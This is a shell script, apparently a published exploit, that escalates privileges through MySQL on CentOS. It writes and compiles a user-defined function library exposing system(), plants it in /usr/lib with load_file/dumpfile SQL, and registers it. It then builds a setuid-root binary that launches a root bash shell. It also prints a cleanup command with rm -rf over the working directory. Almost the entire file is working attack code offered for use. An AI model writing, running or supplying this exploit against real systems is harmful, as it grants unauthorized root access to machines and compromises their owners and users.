#!/bin/sh

#					  THE REQUIREMENTS 
########################################################################
#
#	GCC
#	MySQL installed (lul)
#	MySQL user as root (user=root in /etc/my.cnf)
#	MySQL datadire usable by the root user
#
########################################################################

#					 TESTED ENVIRONMENT
########################################################################
#
#	Cent OS x86 5.4 Final
#	MySQL 5.0.77
#	MySQL 5.0.95
#	GCC version 4.1.2
#
########################################################################

#						THE COLORZ
########################################################################
STD=$(echo -e "\e[0;0;0m")		#Revert fonts to standard colour/format
RED=$(echo -e "\e[1;31m")		#Alter fonts to red bold
ORN=$(echo -e "\e[1;33m")		#Alter fonts to orange bold
BLU=$(echo -e "\e[1;36m")		#Alter fonts to blue bold
#

echo ""
echo $BLU"[*]$STD Author: _amonsec"
echo $BLU"[*]$STD CentOS mysql priviledge escalation"
echo $BLU"[*]$STD Thanks: Top-Hat-Sec"
echo ""

if ( ! touch test.txt 2> /dev/null ) ; then
	echo "$RED[!]$STD You need to be in a writable place"
	exit 2
fi

rm test.txt >/dev/null
ACTUAL_PATH=$(pwd)

echo "$BLU[*]$STD Create the exploit C code"
echo "#include <stdio.h>" >  mysql_exploit.c
echo "#include <stdlib.h>" >> mysql_exploit.c
echo "enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};" >> mysql_exploit.c
echo "" >> mysql_exploit.c
echo "typedef struct st_udf_args {" >> mysql_exploit.c
echo "unsigned int arg_count;" >> mysql_exploit.c
echo "enum Item_result *arg_type;" >> mysql_exploit.c
echo "char **args;" >> mysql_exploit.c
echo "unsigned long *lengths;" >> mysql_exploit.c
echo "char *maybe_null;" >> mysql_exploit.c
echo "} UDF_ARGS;" >> mysql_exploit.c
echo "" >> mysql_exploit.c
echo "typedef struct st_udf_init {" >> mysql_exploit.c
echo "char maybe_null;" >> mysql_exploit.c
echo "unsigned int decimals;" >> mysql_exploit.c
echo "unsigned long max_length;" >> mysql_exploit.c
echo "char *ptr;" >> mysql_exploit.c
echo "char const_item;"	>> mysql_exploit.c
echo "} UDF_INIT;" >> mysql_exploit.c
echo "" >> mysql_exploit.c
echo "int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {" >> mysql_exploit.c
echo "if (args->arg_count != 1)" >> mysql_exploit.c
echo "return(0);" >> mysql_exploit.c
echo "" >> mysql_exploit.c
echo "system(args->args[0]);" >> mysql_exploit.c
echo "" >> mysql_exploit.c
echo "return(0);" >> mysql_exploit.c
echo "}" >> mysql_exploit.c
echo "char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {" >> mysql_exploit.c
echo "return(0);" >> mysql_exploit.c
echo "}" >> mysql_exploit.c
echo "" >> mysql_exploit.c

echo "$BLU[*]$STD Compile the C exploit"
gcc -g -c mysql_exploit.c 

echo "$BLU[*]$STD Create the shared object"
gcc -g -shared -W1,-soname,mysql_exploit.so -o mysql_exploit.so mysql_exploit.o -lc 

echo "$BLU[*]$STD Create the setuid C file"
echo "#include <stdio.h>" >  setuid.c
echo "#include <sys/types.h>" >> setuid.c
echo "#include <unistd.h>" >> setuid.c
echo "int main(void) { " >> setuid.c
echo "setuid(0);" >> setuid.c
echo "setgid(0);" >> setuid.c
echo 'system("/bin/bash");' >> setuid.c
echo "}" >> setuid.c

echo "$BLU[*]$STD Create the file with SQL commands"
echo "use mysql;" >  commands.sql
echo "create table rekt(line blob);" >> commands.sql
echo "insert into rekt values(load_file('$ACTUAL_PATH/mysql_exploit.so'));" >> commands.sql
echo "select * from rekt into dumpfile '/usr/lib/mysql_exploit.so';" >> commands.sql
echo "select * from mysql.func;" >> commands.sql
echo "create function do_system returns integer soname 'mysql_exploit.so';" >> commands.sql
echo "select do_system('gcc -o /tmp/setuid $ACTUAL_PATH/setuid.c');" >> commands.sql
echo "select do_system('chmod u+s /tmp/setuid');" >> commands.sql

echo "$BLU[*]$STD Start the SQL commands"
mysql -u root  < commands.sql

echo ""
echo "$BLU[*]$STD Lulz you are root!"
echo "$BLU[*]$STD Enjoy your shell"
echo ""
echo "$BLU[?]$STD If you want to purge all file run (with copy past):"
echo $ORN" mysql -u root -e 'drop table mysql.rekt;'"
echo " mysql -u root -e 'drop function do_system;'"
echo " rm -rf $ACTUAL_PATH/* /usr/lib/mysql_exploit.so /tmp/setuid"$STD
echo ""

/tmp/setuid